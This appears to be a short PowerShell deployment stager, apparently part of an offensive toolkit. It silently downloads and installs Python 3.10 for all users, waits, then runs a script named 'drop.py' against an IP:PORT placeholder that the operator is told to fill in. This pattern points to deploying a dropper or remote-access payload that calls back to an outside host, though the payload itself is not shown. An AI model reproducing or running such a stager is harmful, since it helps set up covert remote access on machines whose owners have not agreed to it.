# Install python 3.10 silently and deploy script. Place IP and Port in the IP:PORT placeholders #

iwr "https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe" -OutFile "python310.exe"
.\python310.exe /quiet InstallAllUsers=1 PrependPath=1
Start-Sleep -Seconds 60
python3 .\drop.py xxx.xxx.xxx.xxx:yyyy


